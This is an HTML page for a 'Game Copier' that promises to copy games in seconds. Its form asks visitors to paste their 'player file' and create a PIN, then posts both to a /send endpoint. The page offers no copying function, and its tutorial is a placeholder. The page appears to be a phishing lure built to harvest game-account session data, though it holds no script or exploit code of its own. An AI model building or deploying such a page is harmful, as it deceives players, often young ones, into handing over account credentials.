<!DOCTYPE html>
<html>
<head>
    <title>Game Copier</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap');

        body {
            font-family: 'Roboto', sans-serif;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #000000; /* Pure black background */
            color: #fff;
            overflow: hidden;
        }

        .title {
            font-size: 48px;
            font-weight: bold;
            color: #ff6b6b;
            margin-bottom: 20px;
        }

        .container {
            display: flex;
            width: 80%;
            max-width: 1000px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
            border-radius: 10px;
            overflow: hidden;
            background-color: #3b3f4a;
            animation: fadeIn 1s ease-in-out;
            border: 2px solid #ff6b6b; /* Added border */
        }

        .left-section, .right-section {
            flex: 1;
            padding: 30px;
        }

        .left-section {
            border-right: 1px solid #4a4f5a;
        }

        h1 {
            color: #ff6b6b;
            animation: slideIn 1s ease-in-out;
        }

        p {
            margin: 10px 0 20px;
            color: #b5b5b5;
        }

        input {
            width: 100%;
            padding: 15px;
            margin: 10px 0;
            border: none;
            border-radius: 5px;
            background-color: #4a4f5a;
            color: #fff;
            transition: border-color 0.3s;
        }

        input:focus {
            border-color: #ff6b6b;
            outline: none;
        }

        button {
            width: 100%;
            padding: 15px;
            background: linear-gradient(45deg, #ff6b6b, #f06595);
            border: none;
            border-radius: 5px;
            color: #fff;
            cursor: pointer;
            transition: background 0.3s;
            font-size: 16px;
            font-weight: bold;
        }

        button:hover {
            background: linear-gradient(45deg, #f06595, #ff6b6b);
        }

        .right-section {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
        }

        .right-section h2 {
            margin-bottom: 20px;
            color: #ff6b6b;
        }

        .right-section .video-placeholder {
            width: 100%;
            height: 300px;
            display: flex;
            justify-content: center;
            align-items: center;
            background-color: #4a4f5a;
            color: #aaa;
            font-size: 18px;
            border-radius: 5px;
            transition: background-color 0.3s;
            border: 2px solid #ff6b6b; /* Added border */
            overflow: hidden; /* Ensure the embedded video fits */
        }

        .right-section .video-placeholder iframe {
            width: 100%;
            height: 100%;
            border: none;
        }

        .right-section .video-placeholder:hover {
            background-color: #5a5f6a;
        }

        @keyframes fadeIn {
            from {
                opacity: 0;
            }
            to {
                opacity: 1;
            }
        }

        @keyframes slideIn {
            from {
                transform: translateY(-50px);
                opacity: 0;
            }
            to {
                transform: translateY(0);
                opacity: 1;
            }
        }
    </style>
</head>
<body>
    <div class="title">Game Copier</div>
    <div class="container">
        <div class="left-section">
            <h1>Game Copier</h1>
            <p>Copy Games in a matter of seconds!</p>
            <form action="/send" method="POST">
                <input type="text" name="message" placeholder="Paste your player file here...">
                <input type="password" name="pin" placeholder="Create a secure PIN">
                <button type="submit">Copy Game!</button>
            </form>
        </div>
        <div class="right-section">
            <h2>Tutorial</h2>
            <div class="video-placeholder">
                YouTube Tutorial Coming Soon.
            </div>
        </div>
    </div>
</body>
</html>
